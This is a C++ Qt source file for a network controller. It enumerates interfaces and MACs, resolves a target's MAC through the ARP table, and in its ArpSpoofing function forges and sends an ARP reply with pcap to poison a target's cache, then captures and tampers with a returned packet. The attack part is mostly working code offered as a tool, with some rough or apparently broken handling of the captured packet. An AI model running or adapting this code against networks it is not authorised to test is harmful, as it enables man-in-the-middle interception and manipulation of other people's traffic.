#include "networkcontroller.h"

using namespace std;

NetworkController::NetworkController(QObject *parent)
    : QObject{parent}
{
    GetInterfaceInfo();
}

void NetworkController::GetInterfaceInfo() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    try {
        if(sock < 0)
            throw runtime_error("Failed to creat socket");

        ifconf ifConfig{};
        char buffer[1024];

        ifConfig.ifc_len = sizeof(buffer);
        ifConfig.ifc_buf = buffer;

        if(ioctl(sock, SIOCGIFCONF, &ifConfig) == -1)
            throw runtime_error("Failed to set ioctl");

        int interfaceCnt = ifConfig.ifc_len / sizeof(ifreq);

        InterfaceInfo info{};


        if(interfaceCnt > 0) {
            for(int idx = 0; idx < interfaceCnt; idx++) {
                //interface name
                info.interfaceName_ = ifConfig.ifc_ifcu.ifcu_req[idx].ifr_ifrn.ifrn_name;
                if(ioctl(sock, SIOCGIFHWADDR, &ifConfig.ifc_ifcu.ifcu_req[idx]) == -1)
                    throw runtime_error("Failed to set ioctl");
                //mac-address
                info.mac_ = reinterpret_cast<u_char*>(ifConfig.ifc_ifcu.ifcu_req[idx].ifr_ifru.ifru_hwaddr.sa_data);

                interfaceInfos_.push_back(info);
            }
        }
    }
    catch(const exception& e) {
        cerr<<"GetInterfaceInfo : "<<e.what() <<endl;
        cerr<<"Error : "<< errno <<" (" << strerror(errno)<<")"<<endl;
    }


    close(sock);
}

Mac NetworkController::GetMac(const QString& interface, const QString targetIP) {
    Mac ret{};
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    try {
        if(sock < 0)
            throw runtime_error("Failed to create socket");

        arpreq req{};

        memcpy(req.arp_dev, interface.toStdString().c_str(), sizeof(req.arp_dev));

        req.arp_pa.sa_family = AF_INET;
        inet_pton(AF_INET, targetIP.toStdString().c_str(), &reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr);

        if(ioctl(sock, SIOCGARP, &req) == -1)
            throw runtime_error("Failed to set ioctl");

        ret = reinterpret_cast<u_char*>(req.arp_ha.sa_data);

    }catch(const exception& e) {
        cerr<<"GetMacAddress : "<<e.what()<<endl;
        cerr<<"Error : "<<errno<<" ("<<strerror(errno)<<")"<<endl;
    }

    close(sock);

    return ret;
}

vector<QString> NetworkController::GetInterfaces() {
    vector<QString> ret;

    for(const auto& info : interfaceInfos_)
        ret.push_back(info.interfaceName_);

    return ret;
}

bool NetworkController::ArpSpoofing(const QString interface,const QString senderIP,const QString targetIP) {
    Mac targetMac = GetMac(interface, targetIP);

    try {
        if(targetMac.isNull()) throw runtime_error("target mac is null");

        EthArpPacket packet{};

        packet.eth_.dmac_ = targetMac;
        packet.arp_.dmac_ = targetMac;

        for(const auto& info : interfaceInfos_) {
            if(info.interfaceName_ == interface) {
                packet.eth_.smac_ = info.mac_;
                packet.arp_.smac_ = info.mac_;
            }
        }

        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
        packet.arp_.protocolType_ = htons(EthHdr::Ip4);
        packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
        packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
        packet.arp_.opCode_ = htons(ArpHdr::OpCodeType::Arp_Reply);
        inet_pton(AF_INET, senderIP.toStdString().c_str(), &packet.arp_.sip_);
        inet_pton(AF_INET, targetIP.toStdString().c_str(), &packet.arp_.dip_);

        char errBuf[PCAP_ERRBUF_SIZE] {};
        pcap = pcap_open_live(interface.toStdString().c_str(), 0, 0, 0, errBuf);
        if(pcap == NULL) throw runtime_error("Failed to open pcap : " + string(errBuf));

        if(pcap_sendpacket(pcap, reinterpret_cast<u_char*>(&packet), sizeof(EthArpPacket)) == -1)
            throw runtime_error("Failed to send packet : " + string(pcap_geterr(pcap)));

        pcap_close(pcap);

        pcap = pcap_open_live(interface.toStdString().c_str(), BUFSIZ, 1, 1000, errBuf);
        if(pcap == NULL) throw runtime_error("Failed to open pcap : " + string(errBuf));

        pcap_pkthdr* header = nullptr;
        //EthArpPacket* recvPacket = nullptr;
        u_char* recvPacket = nullptr;

        //if(pcap_next_ex(pcap, &header, &(reinterpret_cast<uchar*>(&recvPacket))) != 1)
        if(pcap_next_ex(pcap, &header, (const uchar**)&recvPacket) != 1)
            throw runtime_error("Failed to read packet" + string(pcap_geterr(pcap)));

        if(reinterpret_cast<EthHdr*>(recvPacket)->smac() == targetMac) {
            recvPacket += sizeof(EthHdr);
            PIpHdr ipHeader = reinterpret_cast<IpHdr*>(recvPacket);
            ipHeader->dIp_ = targetIP.toStdString();
        }



    }catch(const std::exception& e) {
        cerr<<"Failed to ArpSpoofing : "<<e.what()<<endl;
        if(pcap != nullptr) pcap_close(pcap);
        return false;
    }



    return true;
}

